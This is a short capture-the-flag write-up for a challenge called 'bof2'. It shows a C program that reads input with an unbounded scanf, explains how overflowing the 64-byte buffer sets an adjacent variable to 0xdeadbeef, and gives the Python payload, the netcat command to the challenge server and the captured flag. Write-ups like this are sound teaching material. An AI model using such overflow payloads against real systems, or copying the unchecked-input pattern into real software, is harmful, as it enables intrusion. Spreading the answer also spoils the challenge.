# bof2

```
#include <stdio.h>
#include <stdlib.h>

void win(void) {
	char flag[64];
	
	FILE* fp = fopen("flag.txt", "r");
	if(!fp) {
		puts("error, contact admin");
		exit(0);
	}
	
	fgets(flag, sizeof(flag), fp);
	fclose(fp);
	puts(flag);
}

int main(void) {
	int correct = 0;
	char bof[64];
	
	scanf("%s", bof);
	
	if(correct != 0xdeadbeef) {
		puts("you suck!");
		exit(0);
	}
	
	win();
	return 0;
}
```
To capture the flag, we need to change the value of ```correct``` to ```0xdeadbeef```.

Since ```correct``` is just up the stack from ```bof```, we can simply overflow the buffer and write ```0xdeadbeef``` into ```correct```.

Note that the x86 architecture is little-endian, so we have to write the value in the reverse order. The payload was written into a file, due to the special characters in the value ```0xdeadbeef```; this was used as the argument in the Netcat connection.

**Solution**
```
$ python -c "print('A' * 64 + '\xef\xbe\xad\xde')" > my_file
$ cat file my_file | nc ctf.hackucf.org 9001

```

**Flag**
```
flag{buffers_and_beef_make_for_a_yummie_pwn_steak}
```
